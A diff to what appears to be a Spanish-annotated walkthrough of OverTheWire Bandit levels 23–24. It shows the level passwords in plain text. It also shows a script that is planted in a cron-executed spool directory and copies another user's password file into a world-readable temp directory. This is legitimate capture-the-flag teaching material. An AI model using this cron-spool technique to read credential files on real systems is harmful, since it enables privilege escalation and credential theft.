@@ -493,8 +493,48 @@ QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
 ```
 
 ```bash
-
 sshpass -p "QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G" ssh bandit23@bandit.labs.overthewire.org -p 2220
 
+#A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+#NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+#NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+export TERM=xterm
+
+/var/spool/bandit24/foo
+# Si se va a copiar un archivo dentro de la ruta seleccionada es necesario especificar que otros usuarios o grupos o TODOS pueden ejecutar el archivo
+ 
+ # Creamos un directorio temporal
+ $ mktemp -d
+ /tmp/tmp.Hna6s3eBMy
+#Vamos a crear una variable que apunte directamente al directorio temporal.
+# Se almacena en la variable dir_name, el nombre del directorio creado. 
+ $ dir_name=$(mktemp -d)
+ /tmp/tmp.asd4j3j
+
+ $ echo $dir_name
+ /tmp/tmp.asd4j3j
+#Se crea un script dentro de la ruta.  
+ $ cd $dir_name
+ /tmp/tmp.asd4j3j $
+
+#Se le asignan los permisos de ejecución para otros, para todos al script
+$ chmod +x script.sh
+# Tamb se le dan permisos a otros usuarios sobre el directorio para que sea posible el escribir la contraseña dentro del directorio
+$ chmod o+wx $dir_name
+
+# Como todo se ejecuta bajo los permisos del usuario de bandit24, se realiza la lectura de la contraseña en la ruta de bandit_pass y se almacenará en la ruta del directorio temporal. Se le dan permiso de lectura a otros sobre el archivo para asegurar de que sea posible ver el contenido. 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.OMPTnwSjfW/bandit24.log
+chmod o+r /tmp/tmp.OMPTnwSjfW/bandit24.log
+
+$ cp script.sh carga.sh
+$ cp carga.sh /var/spool/bandit24/foo
+# se ejecuta el watch -n 1 para ver el estado del directorio segundo a segundo.
+/tmp/tmp.OMPTnwSjfW/$ watch -n 1 ls -l
+
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 
 ```
